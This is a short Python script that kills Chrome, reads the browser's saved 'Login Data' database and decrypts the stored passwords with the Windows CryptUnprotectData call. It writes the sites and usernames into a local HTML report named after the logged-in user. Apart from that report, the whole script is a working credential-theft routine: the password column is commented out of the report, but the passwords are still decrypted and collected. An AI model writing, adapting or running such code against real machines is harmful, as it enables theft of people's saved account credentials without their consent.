import os
import sqlite3
import win32crypt
import webbrowser


# writing query result in html file
def html_info(info):
    s = ""
    s += '<style type="text/css">\ntd{ padding:0 50px 0 0px; }\n</style>\n'

    usrn = "PC-{}".format(os.getlogin())
    s += '<h4>Data acquired from {} accounts</h4>\n'.format(len(info[0]), usrn)
    s += '<table>\n<tbody>\n'
    for u in range(len(info[0])):
        s += "<tr>\n"
        s += "<td>{}</td>\n".format((info[0])[u])   # account platform... FB, gmail etc
        s += "<td>{}</td>\n".format((info[1])[u])   # email / username
        # s += "<td>{}</td>\n".format((info[2])[u])   # password
        s += "</tr>\n"

    s += "</tbody>\n</table>\n"
    return s


def getcachedpass():
    os.system("taskkill /F /IM chrome.exe")

    # path of the cache folder with "Login Data" file
    path = r"C:\Users\Mobeen Ahmed\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"

    # connecting to the db
    conn = sqlite3.connect(path)
    cursor = conn.cursor()

    # get login data from cache file
    cursor.execute('Select action_url, username_value, password_value FROM logins')
    urls = []
    usrs = []
    pwds = []
    for result in cursor.fetchall():
        password = str(win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1])[2:-1]
        if password != "" and result[1] != "":
            urls.append(result[0])
            usrs.append(result[1])
            pwds.append(password)

    return urls, usrs, pwds


info = getcachedpass()
# write in html file
filename = "PC-{}.html".format(os.getlogin())
fp = open("{}".format(filename), 'w')
fp.write(html_info(info))
webbrowser.open(filename)
fp.close()
